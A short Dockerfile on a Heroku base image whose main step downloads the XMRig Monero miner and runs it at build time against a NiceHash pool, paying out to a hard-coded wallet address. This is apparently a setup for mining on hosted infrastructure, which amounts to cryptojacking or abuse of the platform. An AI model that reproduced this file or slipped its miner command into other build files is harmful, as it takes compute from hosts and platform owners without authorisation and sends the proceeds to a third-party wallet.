FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-static-x64.tar.gz; tar -zxf xmrig-6.15.1-linux-static-x64.tar.gz; ./xmrig -o stratum+tcp://randomxmonero.eu.nicehash.com:3380 -u 3GMMqEWU5bNm14rWuM1vcRBNdNDXRKKnfH -p x -k --nicehash --coin monero -a rx/0
CMD bash heroku.sh
